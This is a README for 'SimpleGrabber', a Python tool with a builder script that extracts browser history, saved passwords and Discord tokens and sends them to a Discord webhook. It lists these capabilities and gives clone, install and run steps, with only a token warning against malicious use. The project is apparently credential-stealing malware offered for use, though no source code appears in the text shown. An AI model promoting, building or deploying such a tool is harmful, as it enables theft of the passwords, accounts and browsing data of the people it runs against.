# Simple Grabber

![Simple Grabber Logo](https://i.ibb.co/21cnfcy4/Moneycat.png)

## Overview
_SimpleGrabber is a boilerplate tool built in python to extract browser data to a discord webhook._


## Responsible use
> [!WARNING]
> Please do NOT use this malisciously not only is it illegal but it is not safe for you or anyone.

---

## Features
- Extracts History 
- Extracts Saved Passwords (iffy for non-chromium browsers. edge specifically)  
- Extracts Discord token (browser instance only)


---

## Installation

1. Clone the repository
```bash
git clone https://github.com/Ragoon821/SimpleGrabber.git

```

2. Now change into the project folder:

```bash
cd SimpleGrabber
```

3. You can now install the required packages:

```bash
pip install -r requirements.txt
```
4. And finnally, run the program

```bash
python builder.py
```
